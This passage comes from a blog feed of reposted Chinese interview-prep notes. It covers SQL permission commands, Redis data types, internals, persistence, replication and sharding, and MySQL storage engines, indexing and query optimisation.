查看权限 1SHOW GRANTS FOR myuser; 授予权限 1GRANT SELECT, INSERT ON mydatabase.* TO myuser; 账户用 username@host 的形式定义，username@% 使用的是默认主机名。 删除权限 1REVOKE SELECT, INSERT ON mydatabase.* FROM myuser; GRANT 和 REVOKE 可在几个层次上控制访问权限： 整个服务器，使用 GRANT ALL 和 REVOKE ALL； 整个数据库，使用 ON database.*； 特定的表，使用 ON database.table； 特定的列； 特定的存储过程。 更改密码 必须使用 Password() 函数 1SET PASSWROD FOR myuser = Password('new_password'); 参考资料 BenForta. SQL 必知必会 [M]. 人民邮电出版社, 2013.]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FRedis%2F</url>
    <content type="text"><![CDATA[一、概述 二、数据类型 STRING LIST SET HASH ZSET 三、数据结构 字典 跳跃表 四、使用场景 计数器 缓存 查找表 消息队列 会话缓存 分布式锁实现 其它 五、Redis 与 Memcached 数据类型 数据持久化 分布式 内存管理机制 六、键的过期时间 七、数据淘汰策略 八、持久化 快照持久化 AOF 持久化 九、发布与订阅 十、事务 十一、事件 文件事件 时间事件 事件的调度与执行 十二、复制 连接过程 主从链 十三、Sentinel 十四、分片 十五、一个简单的论坛系统分析 文章信息 点赞功能 对文章进行排序 参考资料 一、概述Redis 是速度非常快的非关系型（NoSQL）内存键值数据库，可以存储键和五种不同类型的值之间的映射。 键的类型只能为字符串，值支持的五种类型数据类型为：字符串、列表、集合、有序集合、散列表。 Redis 支持很多特性，例如将内存中的数据持久化到硬盘中，使用复制来扩展读性能，使用分片来扩展写性能。 二、数据类型 数据类型 可以存储的值 操作 STRING 字符串、整数或者浮点数 对整个字符串或者字符串的其中一部分执行操作 对整数和浮点数执行自增或者自减操作 LIST 列表 从两端压入或者弹出元素 读取单个或者多个元素 进行修剪，只保留一个范围内的元素 SET 无序集合 添加、获取、移除单个元素 检查一个元素是否存在于集合中 计算交集、并集、差集 从集合里面随机获取元素 HASH 包含键值对的无序散列表 添加、获取、移除单个键值对 获取所有键值对 检查某个键是否存在 ZSET 有序集合 添加、获取、删除元素 根据分值范围或者成员来获取元素 计算一个键的排名 What Redis data structures look like STRING 12345678&gt; set hello worldOK&gt; get hello"world"&gt; del hello(integer) 1&gt; get hello(nil) LIST 123456789101112131415161718192021&gt; rpush list-key item(integer) 1&gt; rpush list-key item2(integer) 2&gt; rpush list-key item(integer) 3&gt; lrange list-key 0 -11) "item"2) "item2"3) "item"&gt; lindex list-key 1"item2"&gt; lpop list-key"item"&gt; lrange list-key 0 -11) "item2"2) "item" SET 123456789101112131415161718192021222324252627&gt; sadd set-key item(integer) 1&gt; sadd set-key item2(integer) 1&gt; sadd set-key item3(integer) 1&gt; sadd set-key item(integer) 0&gt; smembers set-key1) "item"2) "item2"3) "item3"&gt; sismember set-key item4(integer) 0&gt; sismember set-key item(integer) 1&gt; srem set-key item2(integer) 1&gt; srem set-key item2(integer) 0&gt; smembers set-key1) "item"2) "item3" HASH 123456789101112131415161718192021222324&gt; hset hash-key sub-key1 value1(integer) 1&gt; hset hash-key sub-key2 value2(integer) 1&gt; hset hash-key sub-key1 value1(integer) 0&gt; hgetall hash-key1) "sub-key1"2) "value1"3) "sub-key2"4) "value2"&gt; hdel hash-key sub-key2(integer) 1&gt; hdel hash-key sub-key2(integer) 0&gt; hget hash-key sub-key1"value1"&gt; hgetall hash-key1) "sub-key1"2) "value1" ZSET 12345678910111213141516171819202122232425&gt; zadd zset-key 728 member1(integer) 1&gt; zadd zset-key 982 member0(integer) 1&gt; zadd zset-key 982 member0(integer) 0&gt; zrange zset-key 0 -1 withscores1) "member1"2) "728"3) "member0"4) "982"&gt; zrangebyscore zset-key 0 800 withscores1) "member1"2) "728"&gt; zrem zset-key member1(integer) 1&gt; zrem zset-key member1(integer) 0&gt; zrange zset-key 0 -1 withscores1) "member0"2) "982" 三、数据结构字典以下是 Redis 字典的主要数据结构，从上往下分析，一个 dict 有两个 dictht，一个 dictht 有一个 dictEntry 数组，每个 dictEntry 有 next 指针因此是一个链表结构。从上面的分析可以看出 Redis 的字典是一个基于拉链法解决冲突的哈希表结构。 1234567typedef struct dict &#123; dictType *type; void *privdata; dictht ht[2]; long rehashidx; /* rehashing not in progress if rehashidx == -1 */ unsigned long iterators; /* number of iterators currently running */&#125; dict; 12345678/* This is our hash table structure. Every dictionary has two of this as we * implement incremental rehashing, for the old to the new table. */typedef struct dictht &#123; dictEntry **table; unsigned long size; unsigned long sizemask; unsigned long used;&#125; dictht; 12345678910typedef struct dictEntry &#123; void *key; union &#123; void *val; uint64_t u64; int64_t s64; double d; &#125; v; struct dictEntry *next;&#125; dictEntry; 哈希表需要具备扩容能力，在扩容时就需要对每个键值对进行 rehash。dict 有两个 dictht，在 rehash 的时候会将一个 dictht 上的键值对重新插入另一个 dictht 上面，完成之后释放空间并交换两个 dictht 的角色。 rehash 操作不是一次性完成，而是采用渐进方式，这是为了避免一次性执行过多的 rehash 操作给服务器带来过大的负担。 渐进式 rehash 通过记录 dict 的 rehashidx 完成，它从 0 开始然后每执行一次 rehash 都会递增。例如在一次 rehash 中，要把 dict[0] rehash 到 dict[1]，这一次会把 dict[0] 上 table[rehashidx] 的键值对 rehash 到 dict[1] 上，dict[0] 的 table[rehashidx] 指向 null，并令 rehashidx++。 在 rehash 期间，每次对字典执行添加、删除、查找或者更新操作时，都会执行一次渐进式 rehash。 采用渐进式 rehash 会导致字典中的数据分散在两个 dictht 上，因此对字典的操作也需要到对应的 dictht 去执行。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253/* Performs N steps of incremental rehashing. Returns 1 if there are still * keys to move from the old to the new hash table, otherwise 0 is returned. * * Note that a rehashing step consists in moving a bucket (that may have more * than one key as we use chaining) from the old to the new hash table, however * since part of the hash table may be composed of empty spaces, it is not * guaranteed that this function will rehash even a single bucket, since it * will visit at max N*10 empty buckets in total, otherwise the amount of * work it does would be unbound and the function may block for a long time. */int dictRehash(dict *d, int n) &#123; int empty_visits = n * 10; /* Max number of empty buckets to visit. */ if (!dictIsRehashing(d)) return 0; while (n-- &amp;&amp; d-&gt;ht[0].used != 0) &#123; dictEntry *de, *nextde; /* Note that rehashidx can't overflow as we are sure there are more * elements because ht[0].used != 0 */ assert(d-&gt;ht[0].size &gt; (unsigned long) d-&gt;rehashidx); while (d-&gt;ht[0].table[d-&gt;rehashidx] == NULL) &#123; d-&gt;rehashidx++; if (--empty_visits == 0) return 1; &#125; de = d-&gt;ht[0].table[d-&gt;rehashidx]; /* Move all the keys in this bucket from the old to the new hash HT */ while (de) &#123; uint64_t h; nextde = de-&gt;next; /* Get the index in the new hash table */ h = dictHashKey(d, de-&gt;key) &amp; d-&gt;ht[1].sizemask; de-&gt;next = d-&gt;ht[1].table[h]; d-&gt;ht[1].table[h] = de; d-&gt;ht[0].used--; d-&gt;ht[1].used++; de = nextde; &#125; d-&gt;ht[0].table[d-&gt;rehashidx] = NULL; d-&gt;rehashidx++; &#125; /* Check if we already rehashed the whole table... */ if (d-&gt;ht[0].used == 0) &#123; zfree(d-&gt;ht[0].table); d-&gt;ht[0] = d-&gt;ht[1]; _dictReset(&amp;d-&gt;ht[1]); d-&gt;rehashidx = -1; return 0; &#125; /* More to rehash... */ return 1;&#125; 跳跃表是有序集合的底层实现之一。 跳跃表是基于多指针有序链表实现的，可以看成多个有序链表。 在查找时，从上层指针开始查找，找到对应的区间之后再到下一层去查找。例如下图演示了查找 22 的过程。 与红黑树等平衡树相比，跳跃表具有以下优点： 插入速度非常快速，因为不需要平衡树的旋转操作； 更容易实现； 支持无锁操作。 四、使用场景计数器可以对 String 进行自增自减运算，从而实现计数器功能。 例如对于网站访问量，如果使用 MySQL 数据库进行存储，那么每访问一次网站就要对磁盘进行读写操作。而对 Redis 这种内存型数据库的读写性能非常高，很适合存储这种频繁读写的计数量。 缓存将热点数据放到内存中，设置内存的最大使用量以及淘汰策略来保证缓存的命中率。 查找表例如 DNS 记录就很适合使用 Redis 进行存储。 查找表和缓存类似，也是利用了 Redis 快速的查找特性。但是查找表的内容不能失效，而缓存的内容可以失效。 消息队列List 是一个双向链表，可以通过 lpop 和 lpush 写入和读取消息。 不过最好使用 Kafka、RabbitMQ 等消息中间件。 会话缓存在分布式场景下具有多个应用服务器，可以使用 Redis 来统一存储这些应用服务器的会话信息，使得某个应用服务器宕机时不会丢失会话信息，从而保证高可用。 分布式锁实现在分布式场景下，无法使用单机环境下的锁实现。当多个节点上的进程都需要获取同一个锁时，就需要使用分布式锁来进行同步。 除了可以使用 Redis 自带的 SETNX 命令实现分布式锁之外，还可以使用官方提供的 RedLock 分布式锁实现。 其它Set 可以实现交集、并集等操作，例如共同好友功能。 ZSet 可以实现有序性操作，例如排行榜功能。 五、Redis 与 Memcached两者都是非关系型内存键值数据库。有以下主要不同： 数据类型Memcached 仅支持字符串类型，而 Redis 支持五种不同种类的数据类型，使得它可以更灵活地解决问题。 数据持久化Redis 支持两种持久化策略：RDB 快照和 AOF 日志，而 Memcached 不支持持久化。 分布式Memcached 不支持分布式，只能通过在客户端使用一致性哈希这样的分布式算法来实现分布式存储，这种方式在存储和查询时都需要先在客户端计算一次数据所在的节点。 Redis Cluster 实现了分布式的支持。 内存管理机制在 Redis 中，并不是所有数据都一直存储在内存中，可以将一些很久没用的 value 交换到磁盘。而 Memcached 的数据则会一直在内存中。 Memcached 将内存分割成特定长度的块来存储数据，以完全解决内存碎片的问题，但是这种方式会使得内存的利用率不高，例如块的大小为 128 bytes，只存储 100 bytes 的数据，那么剩下的 28 bytes 就浪费掉了。 六、键的过期时间Redis 可以为每个键设置过期时间，当键过期时，会自动删除该键。 对于散列表这种容器，只能为整个键设置过期时间（整个散列表），而不能为键里面的单个元素设置过期时间。 七、数据淘汰策略可以设置内存最大使用量，当内存使用量超过时施行淘汰策略，具体有 6 种淘汰策略。 策略 描述 volatile-lru 从已设置过期时间的数据集中挑选最近最少使用的数据淘汰 volatile-ttl 从已设置过期时间的数据集中挑选将要过期的数据淘汰 volatile-random 从已设置过期时间的数据集中任意选择数据淘汰 allkeys-lru 从所有数据集中挑选最近最少使用的数据淘汰 allkeys-random 从所有数据集中任意选择数据进行淘汰 noeviction 禁止驱逐数据 如果使用 Redis 来缓存数据时，要保证所有数据都是热点数据，可以将内存最大使用量设置为热点数据占用的内存量，然后启用 allkeys-lru 淘汰策略，将最近最少使用的数据淘汰。 作为内存数据库，出于对性能和内存消耗的考虑，Redis 的淘汰算法（LRU、TTL）实际实现上并非针对所有 key，而是抽样一小部分 key 从中选出被淘汰 key。 八、持久化Redis 是内存型数据库，为了保证数据在断电后不会丢失，需要将内存中的数据持久化到硬盘上。 快照持久化将某个时间点的所有数据都存放到硬盘上。 可以将快照复制到其它服务器从而创建具有相同数据的服务器副本。 如果系统发生故障，将会丢失最后一次创建快照之后的数据。 如果数据量很大，保存快照的时间会很长。 AOF 持久化将写命令添加到 AOF 文件（Append Only File）的末尾。 对硬盘的文件进行写入时，写入的内容首先会被存储到缓冲区，然后由操作系统决定什么时候将该内容同步到硬盘，用户可以调用 file.flush() 方法请求操作系统尽快将缓冲区存储的数据同步到硬盘。可以看出写入文件的数据不会立即同步到硬盘上，在将写命令添加到 AOF 文件时，要根据需求来保证何时同步到硬盘上。 有以下同步选项： 选项 同步频率 always 每个写命令都同步 everysec 每秒同步一次 no 让操作系统来决定何时同步 always 选项会严重减低服务器的性能； everysec 选项比较合适，可以保证系统奔溃时只会丢失一秒左右的数据，并且 Redis 每秒执行一次同步对服务器性能几乎没有任何影响； no 选项并不能给服务器性能带来多大的提升，而且也会增加系统奔溃时数据丢失的数量。 随着服务器写请求的增多，AOF 文件会越来越大。Redis 提供了一种将 AOF 重写的特性，能够去除 AOF 文件中的冗余写命令。 九、发布与订阅订阅者订阅了频道之后，发布者向频道发送字符串消息会被所有订阅者接收到。 某个客户端使用 SUBSCRIBE 订阅一个频道，其它客户端可以使用 PUBLISH 向这个频道发送消息。 发布与订阅模式和观察者模式有以下不同： 观察者模式中，观察者和主题都知道对方的存在；而在发布与订阅模式中，发布者与订阅者不知道对方的存在，它们之间通过频道进行通信。 观察者模式是同步的，当事件触发时，主题会去调用观察者的方法，然后等待方法返回；而发布与订阅模式是异步的，发布者向频道发送一个消息之后，就不需要关心订阅者何时去订阅这个消息。 十、事务一个事务包含了多个命令，服务器在执行事务期间，不会改去执行其它客户端的命令请求。 事务中的多个命令被一次性发送给服务器，而不是一条一条发送，这种方式被称为流水线，它可以减少客户端与服务器之间的网络通信次数从而提升性能。 Redis 最简单的事务实现方式是使用 MULTI 和 EXEC 命令将事务操作包围起来。 十一、事件Redis 服务器是一个事件驱动程序。 文件事件服务器通过套接字与客户端或者其它服务器进行通信，文件事件就是对套接字操作的抽象。 Redis 基于 Reactor 模式开发了自己的网络事件处理器，使用 I/O 多路复用程序来同时监听多个套接字，并将到达的事件传送给文件事件分派器，分派器会根据套接字产生的事件类型调用相应的事件处理器。 时间事件服务器有一些操作需要在给定的时间点执行，时间事件是对这类定时操作的抽象。 时间事件又分为： 定时事件：是让一段程序在指定的时间之内执行一次； 周期性事件：是让一段程序每隔指定时间就执行一次。 Redis 将所有时间事件都放在一个无序链表中，通过遍历整个链表查找出已到达的时间事件，并调用相应的事件处理器。 事件的调度与执行服务器需要不断监听文件事件的套接字才能得到待处理的文件事件，但是不能一直监听，否则时间事件无法在规定的时间内执行，因此监听时间应该根据距离现在最近的时间事件来决定。 事件调度与执行由 aeProcessEvents 函数负责，伪代码如下： 12345678910111213141516def aeProcessEvents(): # 获取到达时间离当前时间最接近的时间事件 time_event = aeSearchNearestTimer() # 计算最接近的时间事件距离到达还有多少毫秒 remaind_ms = time_event.when - unix_ts_now() # 如果事件已到达，那么 remaind_ms 的值可能为负数，将它设为 0 if remaind_ms &lt; 0: remaind_ms = 0 # 根据 remaind_ms 的值，创建 timeval timeval = create_timeval_with_ms(remaind_ms) # 阻塞并等待文件事件产生，最大阻塞时间由传入的 timeval 决定 aeApiPoll(timeval) # 处理所有已产生的文件事件 procesFileEvents() # 处理所有已到达的时间事件 processTimeEvents() 将 aeProcessEvents 函数置于一个循环里面，加上初始化和清理函数，就构成了 Redis 服务器的主函数，伪代码如下： 12345678def main(): # 初始化服务器 init_server() # 一直处理事件，直到服务器关闭为止 while server_is_not_shutdown(): aeProcessEvents() # 服务器关闭，执行清理操作 clean_server() 从事件处理的角度来看，服务器运行流程如下： 十二、复制通过使用 slaveof host port 命令来让一个服务器成为另一个服务器的从服务器。 一个从服务器只能有一个主服务器，并且不支持主主复制。 连接过程 主服务器创建快照文件，发送给从服务器，并在发送期间使用缓冲区记录执行的写命令。快照文件发送完毕之后，开始向从服务器发送存储在缓冲区中的写命令； 从服务器丢弃所有旧数据，载入主服务器发来的快照文件，之后从服务器开始接受主服务器发来的写命令； 主服务器每执行一次写命令，就向从服务器发送相同的写命令。 主从链随着负载不断上升，主服务器可能无法很快地更新所有从服务器，或者重新连接和重新同步从服务器将导致系统超载。为了解决这个问题，可以创建一个中间层来分担主服务器的复制工作。中间层的服务器是最上层服务器的从服务器，又是最下层服务器的主服务器。 十三、SentinelSentinel（哨兵）可以监听主服务器，并在主服务器进入下线状态时，自动从从服务器中选举出新的主服务器。 十四、分片分片是将数据划分为多个部分的方法，可以将数据存储到多台机器里面，也可以从多台机器里面获取数据，这种方法在解决某些问题时可以获得线性级别的性能提升。 假设有 4 个 Reids 实例 R0，R1，R2，R3，还有很多表示用户的键 user:1，user:2，… 等等，有不同的方式来选择一个指定的键存储在哪个实例中。最简单的方式是范围分片，例如用户 id 从 0\1000 的存储到实例 R0 中，用户 id 从 1001\2000 的存储到实例 R1 中，等等。但是这样需要维护一张映射范围表，维护操作代价很高。还有一种方式是哈希分片，使用 CRC32 哈希函数将键转换为一个数字，再对实例数量求模就能知道应该存储的实例。 根据执行分片的位置，可以分为三种分片方式： 客户端分片：客户端使用一致性哈希等算法决定键应当分布到哪个节点。 代理分片：将客户端请求发送到代理上，由代理转发请求到正确的节点上。 服务器分片：Redis Cluster。 十五、一个简单的论坛系统分析该论坛系统功能如下： 可以发布文章； 可以对文章进行点赞； 在首页可以按文章的发布时间或者文章的点赞数进行排序显示。 文章信息文章包括标题、作者、赞数等信息，在关系型数据库中很容易构建一张表来存储这些信息，在 Redis 中可以使用 HASH 来存储每种信息以及其对应的值的映射。 Redis 没有关系型数据库中的表这一概念来将同种类型的数据存放在一起，而是使用命名空间的方式来实现这一功能。键名的前面部分存储命名空间，后面部分的内容存储 ID，通常使用 : 来进行分隔。例如下面的 HASH 的键名为 article:92617，其中 article 为命名空间，ID 为 92617。 点赞功能当有用户为一篇文章点赞时，除了要对该文章的 votes 字段进行加 1 操作，还必须记录该用户已经对该文章进行了点赞，防止用户点赞次数超过 1。可以建立文章的已投票用户集合来进行记录。 为了节约内存，规定一篇文章发布满一周之后，就不能再对它进行投票，而文章的已投票集合也会被删除，可以为文章的已投票集合设置一个一周的过期时间就能实现这个规定。 对文章进行排序为了按发布时间和点赞数进行排序，可以建立一个文章发布时间的有序集合和一个文章点赞数的有序集合。（下图中的 score 就是这里所说的点赞数；下面所示的有序集合分值并不直接是时间和点赞数，而是根据时间和点赞数间接计算出来的） 参考资料 Carlson J L. Redis in Action[J]. Media.johnwiley.com.au, 2013. 黄健宏. Redis 设计与实现 [M]. 机械工业出版社, 2014. REDIS IN ACTION Skip Lists: Done Right 论述 Redis 和 Memcached 的差异 Redis 3.0 中文版- 分片 Redis 应用场景 Observer vs Pub-Sub]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FMySQL%2F</url>
    <content type="text"><![CDATA[一、存储引擎 InnoDB MyISAM 比较 二、数据类型 整型 浮点数 字符串 时间和日期 三、索引 B Tree 原理 索引分类 索引的优点 索引优化 四、查询性能优化 使用 Explain 进行分析 优化数据访问 重构查询方式 五、切分 水平切分 垂直切分 Sharding 策略 Sharding 存在的问题及解决方案 六、复制 主从复制 读写分离 参考资料 一、存储引擎InnoDBInnoDB 是 MySQL 默认的事务型存储引擎，只有在需要 InnoDB 不支持的特性时，才考虑使用其它存储引擎。 实现了四个标准的隔离级别，默认级别是可重复读（REPEATABLE READ）。在可重复读隔离级别下，通过多版本并发控制（MVCC）+ 间隙锁（next-key locking）防止幻影读。 主索引是聚簇索引，在索引中保存了数据，从而避免直接读取磁盘，因此对查询性能有很大的提升。 内部做了很多优化，包括从磁盘读取数据时采用的可预测性读、能够加快读操作并且自动创建的自适应哈希索引、能够加速插入操作的插入缓冲区等。 支持真正的在线热备份。其它存储引擎不支持在线热备份，要获取一致性视图需要停止对所有表的写入，而在读写混合场景中，停止写入可能也意味着停止读取。 MyISAMMyISAM 设计简单，数据以紧密格式存储。对于只读数据，或者表比较小、可以容忍修复操作，则依然可以使用 MyISAM。 MyISAM 提供了大量的特性，包括压缩表、空间数据索引等。 不支持事务。 不支持行级锁，只能对整张表加锁，读取时会对需要读到的所有表加共享锁，写入时则对表加排它锁。但在表有读取操作的同时，也可以往表中插入新的记录，这被称为并发插入（CONCURRENT INSERT）。 可以手工或者自动执行检查和修复操作，但是和事务恢复以及崩溃恢复不同，可能导致一些数据丢失，而且修复操作是非常慢的。 如果指定了 DELAY_KEY_WRITE 选项，在每次修改执行完成时，不会立即将修改的索引数据写入磁盘，而是会写到内存中的键缓冲区，只有在清理键缓冲区或者关闭表的时候才会将对应的索引块写入磁盘。这种方式可以极大的提升写入性能，但是在数据库或者主机崩溃时会造成索引损坏，需要执行修复操作。 比较 事务：InnoDB 是事务型的，可以使用 Commit 和 Rollback 语句。 并发：MyISAM 只支持表级锁，而 InnoDB 还支持行级锁。 外键：InnoDB 支持外键。 备份：InnoDB 支持在线热备份。 崩溃恢复：MyISAM 崩溃后发生损坏的概率比 InnoDB 高很多，而且恢复的速度也更慢。 其它特性：MyISAM 支持压缩表和空间数据索引。 二、数据类型整型TINYINT, SMALLINT, MEDIUMINT, INT, BIGINT 分别使用 8, 16, 24, 32, 64 位存储空间，一般情况下越小的列越好。 INT(11) 中的数字只是规定了交互工具显示字符的个数，对于存储和计算来说是没有意义的。 浮点数FLOAT 和 DOUBLE 为浮点类型，DECIMAL 为高精度小数类型。CPU 原生支持浮点运算，但是不支持 DECIMAl 类型的计算，因此 DECIMAL 的计算比浮点类型需要更高的代价。 FLOAT、DOUBLE 和 DECIMAL 都可以指定列宽，例如 DECIMAL(18, 9) 表示总共 18 位，取 9 位存储小数部分，剩下 9 位存储整数部分。 字符串主要有 CHAR 和 VARCHAR 两种类型，一种是定长的，一种是变长的。 VARCHAR 这种变长类型能够节省空间，因为只需要存储必要的内容。但是在执行 UPDATE 时可能会使行变得比原来长，当超出一个页所能容纳的大小时，就要执行额外的操作。MyISAM 会将行拆成不同的片段存储，而 InnoDB 则需要分裂页来使行放进页内。 VARCHAR 会保留字符串末尾的空格，而 CHAR 会删除。 时间和日期MySQL 提供了两种相似的日期时间类型：DATATIME 和 TIMESTAMP。 1. DATATIME能够保存从 1001 年到 9999 年的日期和时间，精度为秒，使用 8 字节的存储空间。 它与时区无关。 默认情况下，MySQL 以一种可排序的、无歧义的格式显示 DATATIME 值，例如“2008-01-16 22:37:08”，这是 ANSI 标准定义的日期和时间表示方法。 2. TIMESTAMP和 UNIX 时间戳相同，保存从 1970 年 1 月 1 日午夜（格林威治时间）以来的秒数，使用 4 个字节，只能表示从 1970 年 到 2038 年。 它和时区有关，也就是说一个时间戳在不同的时区所代表的具体时间是不同的。 MySQL 提供了 FROM_UNIXTIME() 函数把 UNIX 时间戳转换为日期，并提供了 UNIX_TIMESTAMP() 函数把日期转换为 UNIX 时间戳。 默认情况下，如果插入时没有指定 TIMESTAMP 列的值，会将这个值设置为当前时间。 应该尽量使用 TIMESTAMP，因为它比 DATETIME 空间效率更高。 三、索引索引能够轻易将查询性能提升几个数量级。 对于非常小的表、大部分情况下简单的全表扫描比建立索引更高效。对于中到大型的表，索引就非常有效。但是对于特大型的表，建立和维护索引的代价将会随之增长。这种情况下，需要用到一种技术可以直接区分出需要查询的一组数据，而不是一条记录一条记录地匹配，例如可以使用分区技术。 索引是在存储引擎层实现的，而不是在服务器层实现的，所以不同存储引擎具有不同的索引类型和实现。 B Tree 原理1. B-Tree 定义一条数据记录为一个二元组 [key, data]，B-Tree 是满足下列条件的数据结构： 所有叶节点具有相同的深度，也就是说 B-Tree 是平衡的； 一个节点中的 key 从左到右非递减排列； 如果某个指针的左右相邻 key 分别是 keyi 和 keyi+1，且不为 null，则该指针指向节点的所有 key 大于等于 keyi 且小于等于 keyi+1。 查找算法：首先在根节点进行二分查找，如果找到则返回对应节点的 data，否则在相应区间的指针指向的节点递归进行查找。 由于插入删除新的数据记录会破坏 B-Tree 的性质，因此在插入删除时，需要对树进行一个分裂、合并、旋转等操作以保持 B-Tree 性质。 2. B+Tree 与 B-Tree 相比，B+Tree 有以下不同点： 每个节点的指针上限为 2d 而不是 2d+1（d 为节点的出度）； 内节点不存储 data，只存储 key； 叶子节点不存储指针。 3. 顺序访问指针 一般在数据库系统或文件系统中使用的 B+Tree 结构都在经典 B+Tree 基础上进行了优化，在叶子节点增加了顺序访问指针，做这个优化的目的是为了提高区间访问的性能。 4. 优势红黑树等平衡树也可以用来实现索引，但是文件系统及数据库系统普遍采用 B Tree 作为索引结构，主要有以下两个原因： （一）更少的检索次数 平衡树检索数据的时间复杂度等于树高 h，而树高大致为 O(h)=O(logdN)，其中 d 为每个节点的出度。 红黑树的出度为 2，而 B Tree 的出度一般都非常大。红黑树的树高 h 很明显比 B Tree 大非常多，因此检索的次数也就更多。 B+Tree 相比于 B-Tree 更适合外存索引，因为 B+Tree 内节点去掉了 data 域，因此可以拥有更大的出度，检索效率会更高。 （二）利用计算机预读特性 为了减少磁盘 I/O，磁盘往往不是严格按需读取，而是每次都会预读。这样做的理论依据是计算机科学中著名的局部性原理：当一个数据被用到时，其附近的数据也通常会马上被使用。预读过程中，磁盘进行顺序读取，顺序读取不需要进行磁盘寻道，并且只需要很短的旋转时间，因此速度会非常快。 操作系统一般将内存和磁盘分割成固态大小的块，每一块称为一页，内存与磁盘以页为单位交换数据。数据库系统将索引的一个节点的大小设置为页的大小，使得一次 I/O 就能完全载入一个节点，并且可以利用预读特性，相邻的节点也能够被预先载入。 更多内容请参考：MySQL 索引背后的数据结构及算法原理 索引分类1. B+Tree 索引B+Tree 索引是大多数 MySQL 存储引擎的默认索引类型。 因为不再需要进行全表扫描，只需要对树进行搜索即可，因此查找速度快很多。除了用于查找，还可以用于排序和分组。 可以指定多个列作为索引列，多个索引列共同组成键。 B+Tree 索引适用于全键值、键值范围和键前缀查找，其中键前缀查找只适用于最左前缀查找。 如果不是按照索引列的顺序进行查找，则无法使用索引。 InnoDB 的 B+Tree 索引分为主索引和辅助索引。 主索引的叶子节点 data 域记录着完整的数据记录，这种索引方式被称为聚簇索引。因为无法把数据行存放在两个不同的地方，所以一个表只能有一个聚簇索引。 辅助索引的叶子节点的 data 域记录着主键的值，因此在使用辅助索引进行查找时，需要先查找到主键值，然后再到主索引中进行查找。 2. 哈希索引InnoDB 引擎有一个特殊的功能叫“自适应哈希索引”，当某个索引值被使用的非常频繁时，会在 B+Tree 索引之上再创建一个哈希索引，这样就让 B+Tree 索引具有哈希索引的一些优点，比如快速的哈希查找。 哈希索引能以 O(1) 时间进行查找，但是失去了有序性，它具有以下限制： 无法用于排序与分组； 只支持精确查找，无法用于部分查找和范围查找； 3. 全文索引MyISAM 存储引擎支持全文索引，用于查找文本中的关键词，而不是直接比较是否相等。查找条件使用 MATCH AGAINST，而不是普通的 WHERE。 全文索引一般使用倒排索引实现，它记录着关键词到其所在文档的映射。 InnoDB 存储引擎在 MySQL 5.6.4 版本中也开始支持全文索引。 4. 空间数据索引（R-Tree）MyISAM 存储引擎支持空间数据索引，可以用于地理数据存储。空间数据索引会从所有维度来索引数据，可以有效地使用任意维度来进行组合查询。 必须使用 GIS 相关的函数来维护数据。 索引的优点 大大减少了服务器需要扫描的数据行数。 帮助服务器避免进行排序和创建临时表（B+Tree 索引是有序的，可以用来做 ORDER BY 和 GROUP BY 操作）； 将随机 I/O 变为顺序 I/O（B+Tree 索引是有序的，也就将相邻的数据都存储在一起）。 索引优化1. 独立的列在进行查询时，索引列不能是表达式的一部分，也不能是函数的参数，否则无法使用索引。 例如下面的查询不能使用 actor_id 列的索引： 1SELECT actor_id FROM sakila.actor WHERE actor_id + 1 = 5; 2. 多列索引在需要使用多个列作为条件进行查询时，使用多列索引比使用多个单列索引性能更好。例如下面的语句中，最好把 actor_id 和 film_id 设置为多列索引。 12SELECT film_id, actor_ id FROM sakila.film_actorWhERE actor_id = 1 AND film_id = 1; 3. 索引列的顺序让选择性最强的索引列放在前面，索引的选择性是指：不重复的索引值和记录总数的比值。最大值为 1，此时每个记录都有唯一的索引与其对应。选择性越高，查询效率也越高。 例如下面显示的结果中 customer_id 的选择性比 staff_id 更高，因此最好把 customer_id 列放在多列索引的前面。 1234SELECT COUNT(DISTINCT staff_id)/COUNT(*) AS staff_id_selectivity,COUNT(DISTINCT customer_id)/COUNT(*) AS customer_id_selectivity,COUNT(*)FROM payment; 123 staff_id_selectivity: 0.0001customer_id_selectivity: 0.0373 COUNT(*): 16049 4. 前缀索引对于 BLOB、TEXT 和 VARCHAR 类型的列，必须使用前缀索引，只索引开始的部分字符。 对于前缀长度的选取需要根据索引选择性来确定。 5. 覆盖索引索引包含所有需要查询的字段的值。 具有以下优点： 因为索引条目通常远小于数据行的大小，所以若只读取索引，能大大减少数据访问量。 一些存储引擎（例如 MyISAM）在内存中只缓存索引，而数据依赖于操作系统来缓存。因此，只访问索引可以不使用系统调用（通常比较费时）。 对于 InnoDB 引擎，若辅助索引能够覆盖查询，则无需访问主索引。 四、查询性能优化使用 Explain 进行分析Explain 用来分析 SELECT 查询语句，开发人员可以通过分析 Explain 结果来优化查询语句。 比较重要的字段有： select_type : 查询类型，有简单查询、联合查询、子查询等 key : 使用的索引 rows : 扫描的行数 更多内容请参考：MySQL 性能优化神器 Explain 使用分析 优化数据访问1. 减少请求的数据量（一）只返回必要的列 最好不要使用 SELECT * 语句。 （二）只返回必要的行 使用 WHERE 语句进行查询过滤，有时候也需要使用 LIMIT 语句来限制返回的数据。 （三）缓存重复查询的数据 使用缓存可以避免在数据库中进行查询，特别要查询的数据经常被重复查询，缓存可以带来的查询性能提升将会是非常明显的。 2. 减少服务器端扫描的行数最有效的方式是使用索引来覆盖查询。 重构查询方式1. 切分大查询一个大查询如果一次性执行的话，可能一次锁住很多数据、占满整个事务日志、耗尽系统资源、阻塞很多小的但重要的查询。 1DELEFT FROM messages WHERE create &lt; DATE_SUB(NOW(), INTERVAL 3 MONTH); 12345rows_affected = 0do &#123; rows_affected = do_query( "DELETE FROM messages WHERE create &lt; DATE_SUB(NOW(), INTERVAL 3 MONTH) LIMIT 10000")&#125; while rows_affected &gt; 0 2. 分解大连接查询将一个大连接查询（JOIN）分解成对每一个表进行一次单表查询，然后将结果在应用程序中进行关联，这样做的好处有： 让缓存更高效。对于连接查询，如果其中一个表发生变化，那么整个查询缓存就无法使用。而分解后的多个查询，即使其中一个表发生变化，对其它表的查询缓存依然可以使用。 